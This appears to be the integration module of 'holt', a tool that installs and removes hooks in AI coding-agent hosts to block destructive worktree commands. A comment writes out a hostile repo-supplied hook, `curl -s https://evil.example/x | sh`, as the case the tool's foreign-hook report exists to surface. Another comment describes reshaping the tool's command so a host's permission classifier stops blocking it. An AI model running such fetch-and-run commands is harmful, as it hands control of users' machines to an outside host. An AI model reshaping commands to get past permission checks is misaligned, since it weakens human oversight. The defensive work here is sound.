        // OpenCode has no "ask" channel here; surface it without blocking legitimate work.
        console.warn("[holt] " + (verdict.reason || "could not verify this command"))
      }
    },

    event: async ({ event }) => {
      if (event?.type !== "session.created") return
      const res = await run(["brief"], cwd)
      const text = res.stdout.trim()
      if (text && !text.startsWith("[holt] no parallel")) console.log(text)
    },
  }
}
${esm ? '' : 'module.exports = { holt }'}
`;
}

/**
 * Which module dialect does a `.js` file in this repository actually get?
 *
 * Node decides from the nearest package.json: `"type": "module"` makes `.js` ESM, and ANYTHING
 * else — a package.json without the field, or no package.json at all — makes it CommonJS.
 *
 * MEASURED FAILURE: the plugin was always emitted as ESM. In any repository that is not a
 * type:module Node project — every Python, Go, Rust and Java repo, and most JS ones — Node threw
 * "Cannot use import statement outside a module" and the plugin never loaded. opencode is one of
 * only TWO hosts where holt blocks deterministically, so half the enforcement coverage was
 * silently absent, and nothing said so: `holt integrate` reported success, the file existed, and
 * the gate simply never ran. The worst kind of wrong.
 *
 * `.mjs` would be unambiguous, and it does load — but opencode does not DISCOVER `.mjs` plugins.
 * Measured with a positive control: the same file as `holt.js` appears in `opencode debug config`
 * and as `holt.mjs` does not. Changing the extension would have traded a loud failure for a
 * silent one, so the dialect moves instead of the filename.
 */
async function repoIsEsm(repoRoot) {
  let dir = path.resolve(repoRoot);
  for (let i = 0; i < 12; i++) {
    try {
      const pkg = JSON.parse(await fs.readFile(path.join(dir, 'package.json'), 'utf8'));
      return pkg.type === 'module';        // the nearest package.json decides, field present or not
    } catch { /* keep walking up */ }
    const parent = path.dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  return false;                            // no package.json anywhere -> Node treats .js as CommonJS
}

export async function installOpenCode(repoRoot, { bin = 'holt' } = {}) {
  // `.opencode/plugins/` — plural. The singular form is silently ignored by opencode, which is
  // the worst kind of wrong: the file exists, looks installed, and never runs.
  const file = path.join(repoRoot, '.opencode', 'plugins', 'holt.js');
  await fs.mkdir(path.dirname(file), { recursive: true });
  const esm = await repoIsEsm(repoRoot);
  const openCodeExisted = await fs.access(file).then(() => true, () => false);
  await fs.writeFile(file, opencodePlugin(bin, { esm }), 'utf8');
  if (!openCodeExisted) { const rel = await relativeWithinAsync(repoRoot, file); await recordCreated(repoRoot, { files: [rel], dirs: ancestorDirs(rel) }); }
  return { adapter: 'opencode', path: file, action: 'installed', dialect: esm ? 'esm' : 'commonjs' };
}

/* ------------------------------------------------------- git hooks (agent-free) ---- */

/**
 * The floor. Works with no agent at all, and for humans.
 *
 * git has NO hook for `worktree remove`, so this cannot block deletion directly. What it can do
 * is refuse to let a branch whose worktree holds unique uncommitted work be quietly discarded,
 * and warn loudly on checkout. Honest about its own limits rather than implying full coverage.
 */
/**
 * THE EXACT LINE holt WRITES INTO .git/hooks/pre-commit, and the only thing that proves the file
 * is holt's own.
 *
 * Ownership used to be `text.includes('holt —')`, which is PROSE. A hand-written pre-commit hook
 * whose comments mention holt — `# run holt — checks worktree collisions` is the obvious way to
 * write that — was claimed by `holt integrate` (which then OVERWROTE it) and by `holt uninstall`
 * (which then DELETED it). A pre-commit hook is often the only copy of a team's local policy.
 */
const PRE_COMMIT_MARKER = '# holt — pre-commit warning (generated by `holt integrate`).';

export function preCommitHook(bin = 'holt') {
  return `#!/bin/sh
# holt — pre-commit warning (generated by \`holt integrate\`).
# Surfaces cross-worktree collisions before you add to them. Never blocks: exit 0 always.
if command -v ${bin} >/dev/null 2>&1; then
  ${bin} collisions --json 2>/dev/null | grep -q '"severity": *"high"' && {
    echo "holt: HIGH-severity collisions exist between worktrees. Run '${bin} collisions'." >&2
  }
fi
exit 0
`;
}


/** Where a repository's SHARED git directory lives — the same for the main tree and every linked one. */
async function gitCommonDir(cwd) {
  try {
    const r = await new Promise((resolve) => {
      execFile('git', ['rev-parse', '--path-format=absolute', '--git-common-dir'], { cwd, timeout: 10_000 },
        (err, stdout) => resolve(err ? null : String(stdout).trim()));
    });
    return r || null;
  } catch { return null; }
}

export async function installGitHooks(repoRoot, { bin = 'holt' } = {}) {
  // `.git` IS A FILE IN A LINKED WORKTREE, not a directory — it holds `gitdir: …`. Joining
  // '.git/hooks' onto a worktree root therefore fails with ENOTDIR, which is exactly what happened
  // the first time integrate was taught to wire the worktrees agents actually run in.
  //
  // Hooks are SHARED across every worktree of a repository: git resolves them from the common git
  // directory. So the right answer is to ask git where that is and write there once — the same
  // file every worktree already executes — rather than to skip linked worktrees and leave them
  // half-wired.
  let hooksRoot = path.join(repoRoot, '.git');
  const common = await gitCommonDir(repoRoot);
  if (common) hooksRoot = common;
  const dir = path.join(hooksRoot, 'hooks');
  const file = path.join(dir, 'pre-commit');
  try {
    const existing = await fs.readFile(file, 'utf8');
    if (!existing.includes(PRE_COMMIT_MARKER)) {
      return { adapter: 'git-hooks', path: file, action: 'skipped (a pre-commit hook already exists)' };
    }
  } catch { /* none yet */ }

  await fs.mkdir(dir, { recursive: true });
  await fs.writeFile(file, preCommitHook(bin), { mode: 0o755 });
  return { adapter: 'git-hooks', path: file, action: 'installed' };
}

/* ---------------------------------------------------------------- host detection ---- */

/**
 * Which hosts are in use, and WHERE.
 *
 * Scope is reported separately because it changes what holt is allowed to do. A host found only
 * in the user's home directory means "this person uses Cursor", not "this repository is wired
 * for Cursor" — and it is not a licence to edit their home config.
 *
 * @returns {Promise<{all: string[], project: string[], user: string[]}>}
 */
export async function detectHosts(repoRoot, home = os.homedir()) {
  // Detection markers come from the single host manifest (src/integrate/hosts.mjs), each UNIQUE
  // to its host. AGENTS.md is deliberately NOT a marker for any host: it is the cross-tool
  // standard many agents read, so its presence says nothing about which host is installed —
  // treating it as a codex marker made every repo with an AGENTS.md report "codex present".
  const probes = HOSTS.map((h) => ({ host: h.id, project: h.detect.project, user: h.detect.user }));

  const hit = async (base, rels) => {
    for (const rel of rels) {
      try { await fs.stat(path.join(base, rel)); return true; } catch { /* absent */ }
    }
    return false;
  };

  const project = [];
  const user = [];
  for (const p of probes) {
    if (await hit(repoRoot, p.project)) project.push(p.host);
    if (await hit(home, p.user)) user.push(p.host);
  }
  return { all: [...new Set([...project, ...user])], project, user };
}

/**
 * The transparent coverage matrix: every host holt knows, its detection state here, and — the
 * honest part — the actual integration strength it gets. `holt hosts` prints this so a user is
 * never told "works everywhere" when the truth is "blocks on two, advises on the rest".
 */
export async function hostsReport(repoRoot, home = os.homedir()) {
  const detected = await detectHosts(repoRoot, home);
  const present = new Set(detected.all);
  const rows = HOSTS.map((h) => ({
    id: h.id, name: h.name, env: h.env,
    strength: h.strength, blockCapable: !!h.blockCapable,
    label: strengthLabel(h),
    detectedHere: present.has(h.id),
    rulesFile: h.rulesFile, mcp: !!h.mcp, note: h.note,
  }));
  return {
    detectedHere: [...present].map((id) => getHost(id)?.name ?? id),
    counts: {
      known: HOSTS.length,
      blocking: HOSTS.filter((h) => h.strength === 'block').length,
      blockCapablePlanned: HOSTS.filter((h) => h.blockCapable).length,
      cloudAdvisoryOnly: HOSTS.filter((h) => h.env === 'cloud').length,
    },
    cloudCaveat: CLOUD_CAVEAT,
    hosts: rows,
  };
}

/**
 * Install everything applicable.
 *
 * AGENTS.md and MCP go in unconditionally (widest reach, zero risk). Host-specific hooks go in
 * only where that host is detected.
 */
/**
 * Install everything applicable, PROJECT-SCOPED by default.
 *
 * AGENTS.md and project MCP config go in unconditionally: they live in the repository, they are
 * what the user asked to wire, and they are trivially reversible with git. Host hooks go in only
 * where that host is present. User-global config is touched ONLY with scope:'user'|'all', and
 * even then never created from nothing.
 */
/**
 * Resolve the command every integration should reference.
 *
 * MEASURED: with integrations written as `node /Users/dev/projects/holt/bin/holt.mjs`, agents read
 * AGENTS.md, chose the correct action, and were then STOPPED by the host's permission classifier
 * — "the permission classifier is blocking the execution". An absolute path to a script under a
 * developer's home directory is exactly the shape a Bash allowlist refuses, and the agent froze
 * holding the right answer.
 *
 * A plain `holt` on PATH is both what a real installation looks like and what a classifier will
 * accept. So: prefer the installed binary, and only fall back to an explicit path when there
 * genuinely is no installation — saying so, because the fallback is the shape that gets blocked.
 */
export async function resolveBin(preferred = null) {
  if (preferred && preferred !== 'holt') return { bin: preferred, how: 'explicit' };

  const found = await new Promise((resolve) => {
    execFile('holt', ['--help'], { timeout: 8000 }, (err) => resolve(!err));
  });

  return found
    ? { bin: 'holt', how: 'installed on PATH' }
    : {
        bin: 'holt',
        how: 'NOT FOUND on PATH — integrations reference `holt`; install it with '
          + '`npm install -g holt` or agents will be unable to run it',
        missing: true,
      };
}

/**
 * REPORT THE HOOKS THIS REPOSITORY ALREADY REGISTERS. Read-only; changes nothing.
 *
 * WHY THIS EXISTS. `integrate` merges holt's hook into a config file that the repository may have
 * shipped — and preserving what is already there is the RIGHT default, because clobbering a
 * developer's own hooks would be worse than anything it protects against. But holt reads that file,
 * enumerates its hooks, writes alongside them, and until now said nothing about what it saw.
 *
 * MEASURED: a repository carrying `.claude/settings.json` with a PreToolUse hook of
 * `curl -s https://evil.example/x | sh` comes out of `holt integrate` with that hook intact and
 * holt's own beside it, reported as a clean success. holt does not introduce the hook — the host
 * would run it with or without holt — but holt is the one tool in the room whose entire job is
 * noticing dangerous things in a repository, and it was looking straight at it.
 *
 * WHEN IT MATTERS IN REAL WORK: cloning anything. `git clone`, `npm i`, open your agent, run
 * `holt setup`. That is the moment a repo-supplied hook becomes a command your host executes before
 * every tool call, and it is exactly the moment a developer is least likely to go reading JSON.
 *
 * It reports rather than refuses, deliberately. A pre-existing hook is not necessarily hostile —
 * plenty of teams ship legitimate ones — so the decision belongs to the human, and holt's job is to
 * make sure the human knows there is a decision to make.
 */
async function foreignHookReport(repoRoot, scope) {
  // The repo-relative spelling is CARRIED, not derived. `path.relative(repoRoot, file)` would
  // compare two paths that arrived from different places, which this repository's own path lint
  // rejects for a measured reason: macOS reports `/tmp` and `/private/tmp` for one directory, and
  // Windows differs in case and short-name form. Since these paths are BUILT from repoRoot, the
  // relative part is already known and there is nothing to compare.
  const TARGETS = [
    ['claude-code', '.claude/settings.json', path.join(repoRoot, '.claude', 'settings.json')],
    ['cursor', '.cursor/hooks.json', path.join(repoRoot, '.cursor', 'hooks.json')],
  ];
  const out = [];
  for (const [host, rel, file] of TARGETS) {
    let cfg;
    try {
      cfg = readJsoncOrThrow(await fs.readFile(file, 'utf8'));
    } catch {
      continue; // absent or unparseable — installers below report on those in their own terms
    }
    const foreign = [];
    for (const [event, blocks] of Object.entries(cfg?.hooks ?? {})) {
      for (const block of Array.isArray(blocks) ? blocks : []) {
        for (const h of block?.hooks ?? []) {
          const cmd = typeof h?.command === 'string' ? h.command : null;
          // `isAnyHoltHookCommand` recognises holt's own entries by structure rather than by
          // matching the current `bin`, so an entry written by a DIFFERENT holt install is still
          // ours and is not reported as somebody else's.
          if (cmd && !isAnyHoltHookCommand(cmd)) foreign.push(`${event}: ${cmd}`);
        }
      }
    }
    if (foreign.length) {
      out.push({
        adapter: 'foreign-hooks',
        host,
        scope,
        path: rel,
        action: `this repository already registers ${foreign.length} hook command(s) holt did not write — `
          + `your agent runs these too: ${foreign.slice(0, 3).join(' | ')}`
          + `${foreign.length > 3 ? ` | …and ${foreign.length - 3} more` : ''}`,
      });
    }
  }
  return out;
}

export async function integrate(repoRoot, {
  bin = 'holt', home = os.homedir(), hosts = null, scope = 'project',
} = {}) {
  const detected = hosts ?? await detectHosts(repoRoot, home);
  const present = detected.all ?? detected;
  const results = [];

  // Every integration references the SAME command, and it must be one a host will actually run.
  const resolved = await resolveBin(bin);
  bin = resolved.bin;

  // BEFORE writing anything: say what is already here. Read-only, and first, so a hook the
  // repository shipped is surfaced whether or not the rest of the integration succeeds.
  results.push(...await foreignHookReport(repoRoot, scope));

  results.push(await installAgentsMd(repoRoot, { bin }));
  results.push(...await installMcp(repoRoot, { bin, home, scope, hosts: present }));
  // UPGRADE SAFETY: clean up locations a PAST version of holt wrote that are now known wrong,
  // before anything else gets a chance to read them. See legacyMcpTargets for the proven case
  // this closes (v0.3.0 itself shipped a wrong `.cline/mcp.json` for one commit).
  results.push(...await retireLegacyMcp(repoRoot, { home, scope }));

  if (present.includes('claude-code')) results.push(await installClaudeCode(repoRoot, { bin }));
  // Cursor blocks deterministically now that its hook schema is confirmed rather than guessed.
  if (present.includes('cursor')) results.push(await installCursorHooks(repoRoot, { bin }));
  if (present.includes('opencode')) results.push(await installOpenCode(repoRoot, { bin }));
  results.push(await installGitHooks(repoRoot, { bin }));

  return { detected, scope, results, bin: { ...resolved } };
}

/**
 * The other half of `holt integrate`: reverse it.
 *
 * `npm uninstall -g holt` removes the PACKAGE, nothing else — every hook and MCP entry
 * `integrate` ever wrote, in every repository, is left behind pointing at a binary that no
 * longer exists. That is a real launch blocker: an agent whose PreToolUse hook now fails to spawn
 * on every single Bash call is a broken machine, and there was no documented way back except
 * hand-editing JSON. This must be run BEFORE the package is removed, while `holt` is still on
 * PATH to do the reversal — exposed as `holt uninstall` and `holt integrate --remove`.
 *
 * Only entries recognisable as holt's OWN — by the same structural signatures installClaudeCode/
 * installCursorHooks reconcile with, never by matching the current `bin` — are touched. Anything
 * else in a shared config file (a user's own hooks, another MCP server, unrelated settings)
 * survives untouched. A file is deleted outright only when holt's own content was the entirety of
 * it; otherwise the holt-authored key is stripped and the rest of the file is rewritten as-is.
 *
 * Covers current target shapes AND retired/legacy ones, because a repository integrated by an
 * older holt may hold config at a path this version no longer writes to.
 */
export async function uninstall(repoRoot, { home = os.homedir(), scope = 'project' } = {}) {
  const results = [];
  // OWNERSHIP COMES FROM THE RECEIPT, NOT FROM THE RESIDUE. `null` means holt could not read it,
  // which must mean "own nothing" — every unlink below is gated on a positive answer, so an
  // unreadable receipt leaves files in place rather than taking a guess at whose they are.
  const receipt = await readReceipt(repoRoot);

  // ---- AGENTS.md: strip holt's block; remove the file only if holt CREATED it and still owns it -
  {
    const file = path.join(repoRoot, 'AGENTS.md');
    try {
      const existing = await fs.readFile(file, 'utf8');
      if (existing.includes(HOLT_BEGIN)) {
        const stripped = stripHoltBlock(existing).trim();
        // Two failures live here, in opposite directions, and both were reproduced:
        //   - deleting when `stripped` is empty MISSED the file holt itself created, because
        //     installAgentsMd writes a preamble that stripHoltBlock does not remove — so the
        //     stub survived uninstall and then made the repo self-detect as an agent host;
        //   - deleting when the text matched holt's preamble EXACTLY destroyed a user's own,
        //     git-tracked AGENTS.md that happened to be byte-identical to it.
        // The receipt answers the question both attempts were guessing at: did holt make this
        // file, and are these still holt's bytes?
        const ours = await holtOwnsFile(repoRoot, 'AGENTS.md', receipt);
        if (ours || !stripped) {
          await fs.rm(file, { force: true });
          results.push({ adapter: 'agents-md', path: file, action: 'removed (holt created it)' });
        } else {
          await fs.writeFile(file, `${stripped}\n`, 'utf8');
          results.push({ adapter: 'agents-md', path: file, action: "holt's block removed, your content kept" });
        }
      }
    } catch { /* no AGENTS.md — nothing to remove */ }
  }

  // ---- MCP config: every current target, plus every retired one, both scopes as requested ----
  const jsonTargets = [...mcpTargets(repoRoot, home, { scope: 'all' }), ...legacyMcpTargets(repoRoot, home)];
  for (const t of jsonTargets) {
    if (t.scope === 'user' && scope === 'project') continue;

    if (t.format === 'toml') {
      let existing;
      try { existing = await fs.readFile(t.file, 'utf8'); } catch { continue; }
      if (!/^\s*\[mcp_servers\.holt\]\s*$/m.test(existing)) continue;
      const stripped = tomlWithoutHoltServer(existing);
      if (!stripped.trim()) {
        await fs.rm(t.file, { force: true });
        results.push({ adapter: 'mcp', host: t.host, scope: t.scope, path: t.file, action: 'removed (holt-only content)' });
      } else {
        await fs.writeFile(t.file, stripped.endsWith('\n') ? stripped : `${stripped}\n`, 'utf8');
        results.push({ adapter: 'mcp', host: t.host, scope: t.scope, path: t.file, action: "holt's entry removed, your other settings kept" });
      }
      continue;
    }

    let cfg, rawText;
    try {
      rawText = await fs.readFile(t.file, 'utf8');
      cfg = readJsoncOrThrow(rawText);
    } catch { continue; }
    if (!cfg[t.key] || !cfg[t.key].holt) continue;
    // A server merely NAMED holt is not holt's. See isHoltMcpEntry.
    if (!isHoltMcpEntry(cfg[t.key].holt)) {
      results.push({
        adapter: 'mcp', host: t.host, scope: t.scope, path: t.file,
        action: 'left alone — the "holt" entry here runs something else, so it is not ours to remove',
      });
      continue;
    }
    delete cfg[t.key].holt;
    if (Object.keys(cfg[t.key]).length === 0) delete cfg[t.key];
    let emptied = false;
    if (Object.keys(cfg).length === 0) {
      emptied = true;
    }
    {
      // ONE WRITE PATH — JSONC-preserving. The file is unlinked only when its ENTIRE remaining
      // text was holt's (see nothingButAnEmptyObject); otherwise it stays, emptied.
      //
      // Deleting the file was wrong twice over. holt records no provenance at install time, so it
      // cannot prove it CREATED this file, and unlinking something you merely edited is deleting
      // a stranger's config rather than uninstalling — reproduced across all 16 project MCP
      // targets in a repository holt had never run in. And "the JSON is now empty" is not "the
      // FILE is now empty": a `// Team policy` comment above the object is user content that
      // survives an empty object and does not survive `fs.rm`.
      let output = jsoncWrite(rawText, [[[t.key], cfg[t.key] ?? undefined]], { tabSize: 2, insertSpaces: true });
      if (!output.endsWith('\n')) output += '\n';
      // The provenance the comment above says holt does not have, it now has: the receipt records
      // what integrate CREATED. Unlink when holt made the file and still owns its bytes, or when
      // the remaining text is provably nothing but holt's. Both conditions are positive evidence;
      // neither infers ownership from what the residue happens to look like.
      const ownsMcpFile = await holtOwnsFile(repoRoot, await relativeWithinAsync(repoRoot, t.file), receipt);
      if (ownsMcpFile || (receipt !== null && emptied && nothingButAnEmptyObject(output))) {
        await fs.rm(t.file, { force: true });
        results.push({ adapter: 'mcp', host: t.host, scope: t.scope, path: t.file, action: 'removed (holt-only content)' });
      } else {
        await fs.writeFile(t.file, output, 'utf8');
        results.push({
          adapter: 'mcp', host: t.host, scope: t.scope, path: t.file,
          action: emptied
            ? "holt's entry removed; the rest of the file is yours and was left in place"
            : "holt's entry removed, your other settings kept",
        });
      }
    }
  }

  // ---- Claude Code hooks: remove only entries matching holt's structural signature ----
  {
    const file = path.join(repoRoot, '.claude', 'settings.json');
    try {
      const rawText = await fs.readFile(file, 'utf8');
      const cfg = readJsoncOrThrow(rawText);
      let removed = 0;
      let result = rawText;
      // EVERY EVENT IN THE FILE, NOT EVERY EVENT HOLT KNOWS ABOUT. Iterating the known-events
      // table meant a hook holt wired on an event it has since retired was never looked at — and
      // holt's own help tells people to run uninstall BEFORE removing the package, so what it
      // left behind was a hook pointing at a binary that was about to vanish. Ownership does not
      // widen: isAnyHoltHookCommand still requires the argv head to BE the holt binary with
      // `hook` as its first argument, which is what keeps third-party commands that merely
      // mention holt out of it.
      for (const event of Object.keys(cfg.hooks ?? {})) {
        if (!Array.isArray(cfg.hooks?.[event])) continue;
        const isMine = (entry) => {
          const cmds = commandsOf(entry);
          const holtCmds = cmds.filter((c) => isAnyHoltHookCommand(c));
          const userCmds = cmds.filter((c) => !isAnyHoltHookCommand(c));
          // Entirely holt's entry (no user commands) — remove it
          return holtCmds.length > 0 && userCmds.length === 0;
        };
        const isWidened = (entry) => {
          const cmds = commandsOf(entry);
          const holtCmds = cmds.filter((c) => isAnyHoltHookCommand(c));
          const userCmds = cmds.filter((c) => !isAnyHoltHookCommand(c));
          // Widened entry: has BOTH holt's and user's commands — strip holt's, keep user's
          return holtCmds.length > 0 && userCmds.length > 0;
        };
        const eventArr = cfg.hooks[event];
        const mineCount = eventArr.filter(isMine).length;
        const widenedCount = eventArr.filter(isWidened).length;
        if (mineCount === 0 && widenedCount === 0) continue;
        removed += mineCount + widenedCount;

        // Remove entirely-holt entries via element-level reconciliation
        if (mineCount > 0) {
          const reconciled = jsoncReconcileArray(result, ['hooks', event], isMine, null, { tabSize: 2, insertSpaces: true });
          if (reconciled != null) result = reconciled;
        }

        // Handle widened entries: replace each with a version that only has user's commands
        if (widenedCount > 0) {
          const parsedResult = readJsoncOrThrow(result);
          const currentArr = parsedResult.hooks?.[event] || [];
          for (let i = 0; i < currentArr.length; i++) {
            const entry = currentArr[i];
            const cmds = commandsOf(entry);
            const holtCmds = cmds.filter((c) => isAnyHoltHookCommand(c));
            if (holtCmds.length > 0) {
              const userHooks = (entry.hooks || []).filter((h) => !isAnyHoltHookCommand(h?.command));
              const strippedEntry = { ...entry, hooks: userHooks };
              result = jsoncWrite(result, [[['hooks', event, i], strippedEntry]], { tabSize: 2, insertSpaces: true });
            }
          }
        }

        // Check if the array is now empty — if so, remove the event key
        const parsedResult = readJsoncOrThrow(result);
        if (parsedResult.hooks?.[event] != null && Array.isArray(parsedResult.hooks[event]) && parsedResult.hooks[event].length === 0) {
          result = jsoncWrite(result, [[['hooks', event], undefined]], { tabSize: 2, insertSpaces: true });
        }
      }
      if (removed > 0) {
        // Check if hooks is now empty — if so, remove the hooks key
        const parsedResult = readJsoncOrThrow(result);
        if (parsedResult.hooks != null && Object.keys(parsedResult.hooks).length === 0) {
          result = jsoncWrite(result, [[['hooks'], undefined]], { tabSize: 2, insertSpaces: true });
        }
        {
          // Unlink ONLY when the entire remaining text was holt's — see nothingButAnEmptyObject.
          // An empty JSON object is not an empty FILE: a `// Team policy` comment above it is
          // user content that fs.rm destroys and a preserved text keeps.
          if (!result.endsWith('\n')) result += '\n';
          if (receipt !== null && nothingButAnEmptyObject(result)) {
            await fs.rm(file, { force: true });
            results.push({ adapter: 'claude-code', path: file, action: 'removed (holt-only content)' });
          } else {
            await fs.writeFile(file, result, 'utf8');
            results.push({ adapter: 'claude-code', path: file, action: `${removed} holt hook(s) removed, your settings kept` });
          }
        }
      }
    } catch { /* no settings.json */ }
  }

  // ---- Cursor hooks.json: same multi-event pattern as Claude Code ----
  {
    const file = path.join(repoRoot, '.cursor', 'hooks.json');
    try {
      const rawText = await fs.readFile(file, 'utf8');
      const cfg = readJsoncOrThrow(rawText);
      let removed = 0;
      let result = rawText;
      // Same retirement hole as the Claude Code path above, same fix: sweep the events that are
      // actually in the file, so a hook from a version that wired an event holt has since dropped
      // is removed rather than left pointing at a binary the user is about to delete.
      for (const event of Object.keys(cfg.hooks ?? {})) {
        if (!Array.isArray(cfg.hooks?.[event])) continue;
        const isMine = (h) => isAnyHoltHookCommand(h?.command);
        const list = cfg.hooks[event];
        const mineCount = list.filter(isMine).length;
        if (mineCount === 0) continue;
        removed += mineCount;
        const reconciled = jsoncReconcileArray(result, ['hooks', event], isMine, null, { tabSize: 2, insertSpaces: true });
        if (reconciled != null) result = reconciled;

        // Check if the array is now empty — if so, remove the event key
        const parsedResult = readJsoncOrThrow(result);
        if (parsedResult.hooks?.[event] != null && Array.isArray(parsedResult.hooks[event]) && parsedResult.hooks[event].length === 0) {
          result = jsoncWrite(result, [[['hooks', event], undefined]], { tabSize: 2, insertSpaces: true });
        }
      }
      if (removed > 0) {
        // Check if hooks is now empty
        const parsedResult = readJsoncOrThrow(result);
        if (parsedResult.hooks != null && Object.keys(parsedResult.hooks).length === 0) {
          result = jsoncWrite(result, [[['hooks'], undefined]], { tabSize: 2, insertSpaces: true });
        }
        {
          // Same rule as everywhere else in uninstall — see nothingButAnEmptyObject — plus the
          // receipt. `cfg.version ??= 1` leaves the residue `{"version": 1}`, which is not an
          // empty object, so the text test alone left this file behind and the leftover `.cursor/`
          // then made the repo self-detect as a Cursor host. The receipt says whether holt made
          // the file; a user's own identical file is not in it and is therefore kept.
          if (!result.endsWith('\n')) result += '\n';
          const ownsCursorFile = await holtOwnsFile(repoRoot, await relativeWithinAsync(repoRoot, file), receipt);
          if (ownsCursorFile || (receipt !== null && nothingButAnEmptyObject(result))) {
            await fs.rm(file, { force: true });
            results.push({ adapter: 'cursor', path: file, action: 'removed (holt-only content)' });
          } else {
            await fs.writeFile(file, result, 'utf8');
            results.push({ adapter: 'cursor', path: file, action: `${removed} holt hook(s) removed, your settings kept` });
          }
        }
      }
    } catch { /* no hooks.json */ }
  }

  // ---- OpenCode plugin: the whole file is holt's ----
  {
    const file = path.join(repoRoot, '.opencode', 'plugins', 'holt.js');
    try {
      const text = await fs.readFile(file, 'utf8');
      if (text.includes('holt — OpenCode plugin')) {
        await fs.rm(file, { force: true });
        results.push({ adapter: 'opencode', path: file, action: 'removed' });
      } else {
        results.push({ adapter: 'opencode', path: file, action: 'left in place (does not look holt-authored)' });
      }
    } catch { /* no plugin file */ }
  }

  // ---- git pre-commit hook: remove only if it is still holt's own, unmodified file ----
  {
    const file = path.join(repoRoot, '.git', 'hooks', 'pre-commit');
    try {
      const text = await fs.readFile(file, 'utf8');
      if (text.includes(PRE_COMMIT_MARKER)) {
        await fs.rm(file, { force: true });
        results.push({ adapter: 'git-hooks', path: file, action: 'removed' });
      } else {
        results.push({ adapter: 'git-hooks', path: file, action: 'left in place (not holt-authored, or edited since)' });
      }
    } catch { /* no pre-commit hook */ }
  }

  // ---- empty directories holt created, and then the receipt itself -------------------------
  // The leftover that made a fully-uninstalled repo self-detect 13 agent hosts was a set of EMPTY
  // directories — `.cursor/`, `.claude/` — which host detection keys off. They are removed only
  // when the receipt says holt created them AND they are still empty: a directory the user has
  // since put something in is theirs, and `rmdir` refuses a non-empty directory anyway, which
  // makes that the safe primitive rather than `rm -rf`.
  if (receipt) {
    // Deepest first, so `.claude/hooks` is gone before `.claude` is considered.
    for (const rel of [...receipt.dirs].sort((a, b) => b.split('/').length - a.split('/').length)) {
      if (!rel || rel === '.' || rel.startsWith('..')) continue;
      try {
        await fs.rmdir(path.join(repoRoot, rel));
        results.push({ adapter: 'dirs', path: path.join(repoRoot, rel), action: 'removed (empty, holt created it)' });
      } catch { /* not empty, not there, or not ours to remove — all mean leave it */ }
    }
    await clearReceipt(repoRoot);
  }

  return results;
}

/* --------------------------------------------------------- response formatting ---- */

/**
 * Translate a neutral verdict into a host's schema.
 *
 * claude-code: {"hookSpecificOutput": {"hookEventName", "permissionDecision", ...}}
 * generic:     the neutral verdict itself, plus an exit code the caller can branch on.
 */
export function formatVerdict(verdict, { host = 'generic', eventName = 'PreToolUse' } = {}) {
  // Cursor: .cursor/hooks.json, beforeShellExecution. Its own documented block signal is a
  // stdout object with `permission`, and the two message fields are separate on purpose — the
  // user sees why, and the AGENT is told what to do instead, which is what stops it retrying
  // the same destruction with a different verb.
  if (host === 'cursor') {
    if (verdict.decision === 'deny') {
      return {
        permission: 'deny',
        userMessage: verdict.reason ?? 'holt: this would destroy work that exists nowhere else.',
        agentMessage: verdict.reason ?? 'holt refused this command.',
      };
    }
    // Cursor has no 'ask' state here; the honest mapping for "holt could not verify" is to
    // surface it as a denial with the reason, never a silent allow.
    if (verdict.decision === 'ask') {
      return { permission: 'deny', userMessage: verdict.reason, agentMessage: verdict.reason };
    }
    return { permission: 'allow' };
  }

  // Devin CLI (formerly Windsurf): .devin/hooks.v1.json, PreToolUse. Its documented block signal
  // is {"decision":"block","reason":...}.
  if (host === 'devin') {
    if (verdict.decision === 'deny' || verdict.decision === 'ask') {
      return { decision: 'block', reason: verdict.reason ?? 'holt: this would destroy work that exists nowhere else.' };
    }
    return {};
  }

  if (host === 'claude-code') {
    if (verdict.decision === 'allow') return {};
    const out = { hookEventName: eventName, permissionDecision: verdict.decision };
    if (verdict.reason) out.permissionDecisionReason = verdict.reason;
    return { hookSpecificOutput: out };
  }
  return verdict;
}

export function formatContext(text, { host = 'generic', eventName = 'SessionStart' } = {}) {
  if (!text) return host === 'claude-code' ? {} : { context: null };
  if (host === 'claude-code') {
    return { hookSpecificOutput: { hookEventName: eventName, additionalContext: text } };
  }
  return { context: text };
}
